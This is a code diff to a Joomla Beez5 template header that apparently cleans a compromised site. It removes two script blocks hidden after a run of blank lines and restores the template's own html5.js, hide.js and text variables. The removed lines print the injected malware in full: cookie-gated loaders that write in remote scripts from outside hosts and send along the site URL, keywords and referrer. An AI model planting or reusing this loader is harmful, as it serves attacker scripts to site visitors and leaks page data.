@@ -67,49 +67,30 @@ $doc->addScript($this->baseurl.'/templates/'.$this->template.'/javascript/md_sty
 		<![endif]-->
 <?php if($templateparams->get('html5', 0)) { ?>
 		<!--[if lt IE 9]>
-			
-<![endif]-->
+			<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/javascript/html5.js"></script>
+		<![endif]-->
+<?php } ?>
+		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/javascript/hide.js"></script>
 
+		<script type="text/javascript">
+			var big ='<?php echo (int)$this->params->get('wrapperLarge');?>%';
+			var small='<?php echo (int)$this->params->get('wrapperSmall'); ?>%';
+			var altopen='<?php echo JText::_('TPL_BEEZ5_ALTOPEN', true); ?>';
+			var altclose='<?php echo JText::_('TPL_BEEZ5_ALTCLOSE', true); ?>';
+			var bildauf='<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/plus.png';
+			var bildzu='<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/minus.png';
+			var rightopen='<?php echo JText::_('TPL_BEEZ5_TEXTRIGHTOPEN', true); ?>';
+			var rightclose='<?php echo JText::_('TPL_BEEZ5_TEXTRIGHTCLOSE', true); ?>';
+			var fontSizeTitle='<?php echo JText::_('TPL_BEEZ5_FONTSIZE', true); ?>';
+            var bigger='<?php echo JText::_('TPL_BEEZ5_BIGGER', true); ?>';
+            var reset='<?php echo JText::_('TPL_BEEZ5_RESET', true); ?>';
+            var smaller='<?php echo JText::_('TPL_BEEZ5_SMALLER', true); ?>';
+            var biggerTitle='<?php echo JText::_('TPL_BEEZ5_INCREASE_SIZE', true); ?>';
+            var resetTitle='<?php echo JText::_('TPL_BEEZ5_REVERT_STYLES_TO_DEFAULT', true); ?>';
+            var smallerTitle='<?php echo JText::_('TPL_BEEZ5_DECREASE_SIZE', true); ?>';
+		</script>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://hotelvitoria.net/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'K85164' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
-<script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://ittermann.home.pl/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script></head>
+	</head>
 
 	<body>
 
